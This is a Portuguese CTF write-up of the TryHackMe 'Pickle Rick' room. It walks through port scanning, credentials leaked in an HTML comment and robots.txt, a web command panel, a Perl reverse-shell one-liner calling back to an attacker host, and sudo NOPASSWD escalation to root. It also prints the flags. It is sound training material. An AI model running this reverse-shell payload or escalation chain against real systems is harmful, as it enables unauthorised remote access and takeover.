i# 🥒 Pickle Rick — CTF Writeup
### TryHackMe | Boot-to-Root | Enumeração Web · Command Injection Panel · Escalada de Privilégios via sudo NOPASSWD

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 23/07/2026                                                                             |
| **Data do Pentest**   | 23/07/2026 · 00:27 – 00:58 (GMT-3)                                                     |
| **Alvo**              | `10.64.175.147` — TryHackMe · Pickle Rick                                              |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · Firefox DevTools · revshells.com · Netcat · sudo (GTFOBins) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Pickle Rick** (TryHackMe) em aproximadamente **31 minutos**, por meio de uma cadeia de ataque encadeando reconhecimento de rede, enumeração web (código-fonte HTML e `robots.txt`), autenticação em um painel administrativo com funcionalidade de execução de comandos (Command Panel), obtenção de reverse shell em Perl e escalada de privilégios via configuração insegura de `sudo` (`NOPASSWD: ALL`). Nenhuma vulnerabilidade CVE foi necessária — o comprometimento total dependeu exclusivamente de **exposição indevida de credenciais e falhas de hardening**. Os três ingredientes secretos da poção de Rick (flags) foram capturados com sucesso, confirmando o comprometimento total (root) do sistema.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta            | Versão  | Finalidade                                                                          |
|-----------------------|---------|--------------------------------------------------------------------------------------|
| **Nmap**              | 7.99    | Varredura completa de portas e fingerprinting de serviços (`-sC -sV -p-`)            |
| **Gobuster**          | 3.8.2   | Enumeração de diretórios e arquivos web (wordlist `common.txt`, extensões php/txt)   |
| **Firefox DevTools**  | -       | Inspeção de código-fonte HTML da página inicial                                     |
| **revshells.com**     | Online  | Geração do payload de reverse shell em Perl                                          |
| **Netcat**            | -       | Listener para recepção da reverse shell (`nc -lvnp 4444`)                            |
| **sudo / GTFOBins**   | -       | Escalada de privilégios via `NOPASSWD: ALL`                                          |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

![Nmap](/CTFs/Pickle%20Rick/images/Scan_Namp.png)

> **00:27 GMT-3 · Nmap 7.99 · Alvo: 10.64.175.147**

**Solução:** Varredura completa de portas (`-p-`) com detecção de serviços e scripts padrão (`-sC -sV`). O Nmap identificou **dois serviços ativos**:

```
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http  Apache httpd 2.4.41 (Ubuntu)
        http-title: Rick is sup4r cool
```

Informações adicionais relevantes do scan:

```
OS: Linux 5.x/6.x (aggressive guesses, sem correspondência exata)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Network Distance: 3 hops
Varredura completa (65535 portas TCP): 390,16 segundos
```

A varredura completa (`-p-`) confirmou que nenhuma porta adicional além de 22/tcp e 80/tcp estava aberta, direcionando toda a enumeração subsequente para o serviço web.

---

### FASE 2 — Enumeração Web: Código-Fonte + robots.txt + Gobuster

> **~00:36 GMT-3 · Firefox DevTools + Gobuster 3.8.2**

![Code](/CTFs/Pickle%20Rick/images/Username.png)

#### Página Inicial e Código-Fonte — Descoberta de Username

O acesso a `http://10.64.175.147` exibiu a página **"Help Morty!"**, na qual Rick relata ter se transformado em picles novamente e pede que Morty acesse seu computador para encontrar os três últimos ingredientes secretos da poção — porém sem se lembrar da senha de acesso. A inspeção do código-fonte (DevTools) revelou um comentário HTML deixado por engano:

```html
<!--Note to self, remember username! Username: R1ckRul3s-->
```

O username **`R1ckRul3s`** foi identificado como a primeira metade da credencial de acesso ao portal administrativo.

![robots](/CTFs/Pickle%20Rick/images/robots.txt.png)

#### robots.txt — Pista da Senha

O arquivo `http://10.64.175.147/robots.txt` revelou:

```
Wubbalubbadubdub
```

A frase icônica de Rick Sanchez foi interpretada corretamente como a **senha** de acesso ao portal, complementando o username já obtido.

#### Gobuster — Enumeração de Diretórios

![Gobuster](/CTFs/Pickle%20Rick/images/Scan_Gobuster.png)

Varredura com Gobuster v3.8.2 (`-w common.txt -t 100 -x txt,php`) sobre `http://10.64.175.147/` retornou:

```
.htpasswd      (Status: 403) [Size: 278]
.htaccess      (Status: 403) [Size: 278]
assets         (Status: 301) [Size: 315] → http://10.64.175.147/assets/
denied.php     (Status: 302) [Size: 0]   → /login.php
index.html     (Status: 200) [Size: 1062]
login.php      (Status: 200) [Size: 882]
portal.php     (Status: 302) [Size: 0]   → /login.php
robots.txt     (Status: 200) [Size: 17]
server-status  (Status: 403) [Size: 278]
```

O recurso `portal.php` foi identificado como o painel administrativo, redirecionando para `login.php` sem sessão autenticada — confirmando o alvo direto da fase de acesso inicial.

---

### FASE 3 — Acesso Inicial: Login no Portal + Command Panel + 1º Ingrediente

> **00:48 GMT-3 · login.php → portal.php**

![Portal Credentials](/CTFs/Pickle%20Rick/images/Portal.png)

Com as credenciais obtidas (`R1ckRul3s` : `Wubbalubbadubdub`), o login foi realizado com sucesso em `login.php`, redirecionando para o **Rick Portal** (`portal.php`) — um painel administrativo com um **Command Panel** capaz de executar comandos diretamente no servidor.

![Comand Panel](/CTFs/Pickle%20Rick/images/Coman_Portal.png)

**Comando (Command Panel):**
```
ls
```

```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

A listagem revelou dois arquivos de interesse imediato: `Sup3rS3cretPickl3Ingred.txt` e `clue.txt`. O acesso direto ao primeiro via navegador (`http://10.64.175.147/Sup3rS3cretPickl3Ingred.txt`) retornou o primeiro ingrediente:

![First Flag](/CTFs/Pickle%20Rick/images/First_Flag(Ingredient).png)
> 🚩 **Ingrediente 1 — FLAG CAPTURADA: `mr. meeseek hair`**

```
mr. meeseek hair
```

O arquivo `clue.txt` complementou a investigação:

![Clue](/CTFs/Pickle%20Rick/images/Clue.txt.png)

```
Look around the file system for the other ingredient.
```

---

### FASE 4 — Exploração: Path Traversal + Reverse Shell em Perl + 2º Ingrediente

> **~00:51 GMT-3 · Command Panel + revshells.com + Netcat**

O Command Panel demonstrou restringir a execução de comandos ao diretório web da aplicação. Uma tentativa de navegação relativa confirmou a existência de um arquivo fora do webroot, no diretório pessoal do usuário `rick`, porém sem conseguir efetivamente ler seu conteúdo pelo próprio painel:

![Comand Shell](/CTFs/Pickle%20Rick/images/Shell_Perl.png)

**Comando (Command Panel):**
```
cd ../../../../home/rick && ls
```

```
second ingredients
```

Para contornar essa limitação, optou-se por obter uma **reverse shell completa**. Um payload em Perl foi gerado via `revshells.com`, apontando para o host do atacante (`192.168.157.47:4444`):

```perl
perl -e 'use Socket;$i="192.168.157.47";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Com o listener `nc -lnvp 4444` em escuta, o payload foi submetido ao Command Panel para execução:

```
listening on [any] 4444 ...
connect to [192.168.157.47] from (UNKNOWN) [10.64.175.147] 47288
$ bash -i
www-data@ip-10-64-175-147:/var/www/html$ cd /home/rick
www-data@ip-10-64-175-147:/home/rick$ ls -lha
-rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients

www-data@ip-10-64-175-147:/home/rick$ cat "second ingredients"
1 jerry tear
```
![Second Flag](/CTFs/Pickle%20Rick/images/Second_Flag(Ingredient)_And_Shell.png)
> 🚩 **Ingrediente 2 — FLAG CAPTURADA: `1 jerry tear`**

---

### FASE 5 — Escalada de Privilégios: sudo NOPASSWD + 3º Ingrediente (root)

> **~00:55 GMT-3 · sudo -l + sudo /bin/bash**

O comando `sudo -l` revelou uma configuração crítica de segurança para o usuário `www-data`:

```
Matching Defaults entries for www-data on ip-10-64-175-147:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10-64-175-147:
    (ALL) NOPASSWD: ALL
```

A entrada `(ALL) NOPASSWD: ALL` permite a execução de **qualquer comando como root, sem necessidade de senha** — a escalada mais direta possível:

```bash
www-data@ip-10-64-175-147:/home/rick$ sudo /bin/bash
sudo /bin/bash
whoami
root
cd /root
ls
3rd.txt
cat 3rd.txt
3rd ingredients: fleeb juice
```
![Third Flag and Privilege Escalation](/CTFs/Pickle%20Rick/images/Privilege_Escalation_Third_Flag(Ingredient).png)
> 🚩 **Ingrediente 3 (root) — FLAG CAPTURADA: `fleeb juice`**

Com os três ingredientes reunidos (**mr. meeseek hair**, **1 jerry tear** e **fleeb juice**), a poção de Rick está completa e o comprometimento total do sistema foi confirmado.

---

## ⛓ Linha do Tempo do Comprometimento

```
[00:27 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    Varredura completa -sC -sV -p- sobre 10.64.175.147
    Portas abertas: 22/TCP (OpenSSH 8.2p1) · 80/TCP (Apache 2.4.41)
    http-title: "Rick is sup4r cool"
    ↓
[00:36 GMT-3] FASE 2 — ENUMERAÇÃO WEB
    Código-fonte HTML → comentário revela username "R1ckRul3s"
    robots.txt → senha "Wubbalubbadubdub"
    Gobuster: login.php (200), portal.php (302→login.php), assets/ (301)
    ↓
[00:48 GMT-3] FASE 3 — ACESSO INICIAL (Rick Portal)
    Login em login.php com R1ckRul3s:Wubbalubbadubdub
    Command Panel → "ls" revela Sup3rS3cretPickl3Ingred.txt e clue.txt
    FLAG Ingrediente 1: mr. meeseek hair ✓
    clue.txt → "Look around the file system for the other ingredient."
    ↓
[00:51 GMT-3] FASE 4 — EXPLORAÇÃO (Reverse Shell Perl)
    Path traversal via Command Panel → "second ingredients" em /home/rick
    Payload Perl (revshells.com) → 192.168.157.47:4444
    nc -lnvp 4444 → shell como www-data
    FLAG Ingrediente 2: 1 jerry tear ✓
    ↓
[00:55 GMT-3] FASE 5 — ESCALADA DE PRIVILÉGIOS (sudo NOPASSWD)
    sudo -l → (ALL) NOPASSWD: ALL
    sudo /bin/bash → whoami: root
    FLAG Ingrediente 3 (root): fleeb juice ✓
    ↓
[00:58 GMT-3] COMPROMETIMENTO TOTAL — root@ip-10-64-175-147
    Duração total: ~31 minutos
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-sC -sV -p-`) | Portas 22 (SSH) e 80 (HTTP) abertas; título "Rick is sup4r cool" |
| Enumeração Web | Firefox DevTools (view-source) | Username `R1ckRul3s` exposto em comentário HTML |
| Enumeração Web | Browser (robots.txt) | Senha `Wubbalubbadubdub` exposta em texto plano |
| Enumeração Web | Gobuster 3.8.2 | `login.php`, `portal.php`, `assets/` — painel administrativo mapeado |
| Acesso Inicial | Rick Portal (Command Panel) | Login autenticado + RCE limitado ao webroot; Ingrediente 1 capturado |
| Exploração | Path traversal + Perl reverse shell | Shell interativa como `www-data`; Ingrediente 2 capturado |
| Escalada de Privilégio | `sudo -l` + `sudo /bin/bash` | `NOPASSWD: ALL` → shell root imediata; Ingrediente 3 capturado |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.64.175.147` | Máquina Pickle Rick (TryHackMe) — Linux, Apache 2.4.41 / OpenSSH 8.2p1 |
| Serviços expostos | `22/TCP` (OpenSSH 8.2p1) · `80/TCP` (Apache 2.4.41) | Superfície de ataque inicial |
| Username exposto | `R1ckRul3s` | Comentário HTML na página inicial (`<!--Note to self...-->`) |
| Senha exposta | `Wubbalubbadubdub` | Conteúdo de `robots.txt`, sem qualquer proteção |
| Painel vulnerável | `portal.php` — Command Panel | Executa comandos restritos ao webroot; permite path traversal |
| Arquivo crítico | `/home/rick/second ingredients` | Legível apenas via shell completa (permissões 777) |
| Payload de shell | Perl reverse shell (`revshells.com`) | `192.168.157.47:4444` — shell inicial como `www-data` |
| Configuração sudo insegura | `(ALL) NOPASSWD: ALL` para `www-data` | Permite execução arbitrária de qualquer comando como root |
| Ingrediente 1 | `mr. meeseek hair` | `Sup3rS3cretPickl3Ingred.txt` (webroot) |
| Ingrediente 2 | `1 jerry tear` | `/home/rick/second ingredients` |
| Ingrediente 3 (root) | `fleeb juice` | `/root/3rd.txt` |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1548.003` | Abuse Elevation Control Mechanism: Sudo and Sudo Caching |

---

## ✅ Resumo das Flags

| # | Flag (Ingrediente) | Valor | Localização |
|---|---------------------|-------|-------------|
| 🚩 Ingrediente 1 | `Sup3rS3cretPickl3Ingred.txt` | `mr. meeseek hair` | Webroot (`/var/www/html/`) |
| 🚩 Ingrediente 2 | `second ingredients` | `1 jerry tear` | `/home/rick/` |
| 🚩 Ingrediente 3 (root) | `3rd.txt` | `fleeb juice` | `/root/` |

---

## 📚 Referências

- [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster — OJ Reeves](https://github.com/OJ/gobuster)
- [Reverse Shell Generator](https://www.revshells.com)
- [GTFOBins — sudo](https://gtfobins.github.io/gtfobins/sudo/)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1548.003 — Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---